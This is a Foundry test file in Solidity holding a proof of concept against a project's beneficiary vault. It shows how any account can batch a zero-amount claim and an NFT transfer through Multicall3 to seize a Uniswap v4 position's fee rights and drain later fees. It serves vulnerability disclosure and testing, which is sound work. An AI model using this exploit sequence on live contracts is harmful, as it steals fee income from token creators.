// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

import {Test} from "forge-std/Test.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {IERC721} from "@openzeppelin/contracts/token/ERC721/IERC721.sol";
import {IMulticall3} from "forge-std/interfaces/IMulticall3.sol";
import {Preinstalls} from "@optimism/src/libraries/Preinstalls.sol";
import {IPoolManager} from "@uniswap/v4-core/src/interfaces/IPoolManager.sol";
import {PoolManager} from "@uniswap/v4-core/src/PoolManager.sol";
import {PositionManager} from "@uniswap/v4-periphery/src/PositionManager.sol";
import {IHooks} from "@uniswap/v4-core/src/interfaces/IHooks.sol";
import {PoolKey} from "@uniswap/v4-core/src/types/PoolKey.sol";
import {Currency, CurrencyLibrary} from "@uniswap/v4-core/src/types/Currency.sol";
import {TickMath} from "@uniswap/v4-core/src/libraries/TickMath.sol";
import {IPositionManager} from "@uniswap/v4-periphery/src/interfaces/IPositionManager.sol";
import {Actions} from "@uniswap/v4-periphery/src/libraries/Actions.sol";
import {ActionConstants} from "@uniswap/v4-periphery/src/libraries/ActionConstants.sol";
import {LiquidityAmounts} from "@uniswap/v4-periphery/src/libraries/LiquidityAmounts.sol";
import {UERC20BeneficiaryVault} from "../../src/periphery/UERC20BeneficiaryVault.sol";
import {IBeneficiaryVault} from "../../src/interfaces/IBeneficiaryVault.sol";
import {IClaimableRecipient} from "../../src/interfaces/IClaimableRecipient.sol";
import {MockUERC20} from "../mocks/MockUERC20.sol";

/// @notice PoC for the dev-branch shape of the graffiti path: there is no `register()`, but the
///         mint still happens inside `_beforeClaimTransfer`, and a claim of zero attributed
///         amounts transfers nothing, so it succeeds even though Multicall3 cannot receive ETH.
contract UERC20BeneficiaryVaultMulticall3PoC is Test {
    using CurrencyLibrary for Currency;

    IPoolManager internal constant POOL_MANAGER = IPoolManager(0x000000000004444c5dc75cB358380D2e3dE08A90);
    IPositionManager internal constant POSITION_MANAGER = IPositionManager(0xbD216513d74C8cf14cf4747E6AaA6420FF64ee9e);
    uint160 internal constant SQRT_PRICE_1_1 = 79228162514264337593543950336;
    uint24 internal constant FEE = 10_000;
    int24 internal constant TICK_SPACING = 200;

    UERC20BeneficiaryVault internal vault;
    address internal nativeFallback = makeAddr("nativeFallback");
    address internal tokenFallback = makeAddr("tokenFallback");
    address internal attacker = makeAddr("attacker");
    address internal creator = makeAddr("creator");
    // Stands in for the LBP-era custodian that never registered a beneficiary.
    address internal splitter = makeAddr("splitter");

    function setUp() public {
        deployCodeTo("lib/v4-core/src/PoolManager.sol:PoolManager", abi.encode(address(this)), address(POOL_MANAGER));
        deployCodeTo(
            "lib/v4-periphery/src/PositionManager.sol:PositionManager",
            abi.encode(POOL_MANAGER, address(0), uint256(0), address(0), address(0)),
            address(POSITION_MANAGER)
        );
        vm.etch(Preinstalls.MultiCall3, Preinstalls.MultiCall3Code);
        vault = new UERC20BeneficiaryVault(POSITION_MANAGER, nativeFallback, tokenFallback);
        vm.deal(address(this), 10_000 ether);
    }

    /// @notice The token was launched through the shared Multicall3, so its graffiti names Multicall3.
    ///         Any account can batch a zero-amount claim (which mints the NFT to Multicall3) with a
    ///         transfer of that NFT to itself, permanently capturing the position's fee share.
    function test_PoC_zeroAmountClaimThroughMulticall3SeizesFeeRights() public {
        MockUERC20 token = new MockUERC20("Launched", "LAUNCH", 1_000_000 ether, address(this), Preinstalls.MultiCall3);
        uint256 tokenId = _mintNativePosition(address(token));

        // Unregistered position, nothing attributed yet: the natural window right after launch.
        assertEq(vault.balanceOf(attacker), 0);
        (uint128 pending0, uint128 pending1) = vault.amounts(tokenId);
        assertEq(pending0, 0);
        assertEq(pending1, 0);

        IMulticall3.Call3[] memory calls = new IMulticall3.Call3[](2);
        calls[0] = IMulticall3.Call3({
            target: address(vault),
            allowFailure: false,
            callData: abi.encodeCall(IClaimableRecipient.claim, (tokenId, 0, 0))
        });
        calls[1] = IMulticall3.Call3({
            target: address(vault),
            allowFailure: false,
            callData: abi.encodeCall(IERC721.transferFrom, (Preinstalls.MultiCall3, attacker, tokenId))
        });

        vm.prank(attacker);
        IMulticall3(Preinstalls.MultiCall3).aggregate3(calls);

        assertEq(vault.ownerOf(tokenId), attacker, "attacker now holds the beneficiary NFT");

        // Fees accruing after the seizure pay out to the attacker.
        _credit(tokenId, 5 ether, address(token), 0);
        vm.prank(attacker);
        vault.claim(tokenId, 0, 0);
        assertEq(attacker.balance, 5 ether, "attacker drained the position's fee share");

        // The launching user cannot take the rights back: the LP NFT sits with the splitter.
        vm.prank(creator);
        vm.expectRevert(abi.encodeWithSelector(IBeneficiaryVault.NotPositionOwner.selector, tokenId, creator));
        vault.registerBeneficiary(tokenId, creator);
    }

    /// @notice A claim with a nonzero native amount reverts, because Multicall3 rejects plain ETH
    ///         transfers. This is what blocks the same-transaction theft of already-accrued fees.
    function test_PoC_nonzeroNativeClaimThroughMulticall3Reverts() public {
        MockUERC20 token = new MockUERC20("Launched", "LAUNCH", 1_000_000 ether, address(this), Preinstalls.MultiCall3);
        uint256 tokenId = _mintNativePosition(address(token));
        _credit(tokenId, 1 ether, address(token), 0);

        IMulticall3.Call3[] memory calls = new IMulticall3.Call3[](1);
        calls[0] = IMulticall3.Call3({
            target: address(vault),
            allowFailure: false,
            callData: abi.encodeCall(IClaimableRecipient.claim, (tokenId, 0, 0))
        });

        vm.prank(attacker);
        vm.expectRevert("Multicall3: call failed");
        IMulticall3(Preinstalls.MultiCall3).aggregate3(calls);
    }

    function _mintNativePosition(address launchToken) internal returns (uint256 tokenId) {
        PoolKey memory key = PoolKey({
            currency0: CurrencyLibrary.ADDRESS_ZERO,
            currency1: Currency.wrap(launchToken),
            fee: FEE,
            tickSpacing: TICK_SPACING,
            hooks: IHooks(address(0))
        });
        POOL_MANAGER.initialize(key, SQRT_PRICE_1_1);
        int24 lower = TickMath.minUsableTick(TICK_SPACING);
        int24 upper = TickMath.maxUsableTick(TICK_SPACING);
        uint128 liquidity = LiquidityAmounts.getLiquidityForAmounts(
            SQRT_PRICE_1_1,
            TickMath.getSqrtPriceAtTick(lower),
            TickMath.getSqrtPriceAtTick(upper),
            100 ether,
            100 ether
        );
        bytes memory actions = abi.encodePacked(
            uint8(Actions.MINT_POSITION), uint8(Actions.SETTLE), uint8(Actions.SETTLE), uint8(Actions.TAKE_PAIR)
        );
        bytes[] memory params = new bytes[](4);
        params[0] = abi.encode(key, lower, upper, liquidity, 100 ether, 100 ether, splitter, bytes(""));
        params[1] = abi.encode(key.currency0, ActionConstants.CONTRACT_BALANCE, false);
        params[2] = abi.encode(key.currency1, ActionConstants.CONTRACT_BALANCE, false);
        params[3] = abi.encode(key.currency0, key.currency1, address(this));
        tokenId = POSITION_MANAGER.nextTokenId();
        IERC20(launchToken).transfer(address(POSITION_MANAGER), 100 ether);
        POSITION_MANAGER.modifyLiquidities{value: 100 ether}(abi.encode(actions, params), block.timestamp);
    }

    function _credit(uint256 tokenId, uint256 nativeAmount, address token, uint256 tokenAmount) internal {
        if (nativeAmount != 0) vm.deal(address(vault), address(vault).balance + nativeAmount);
        if (tokenAmount != 0) IERC20(token).transfer(address(vault), tokenAmount);
        vault.onAmountsReceived(tokenId, nativeAmount, tokenAmount);
    }

    receive() external payable {}
}
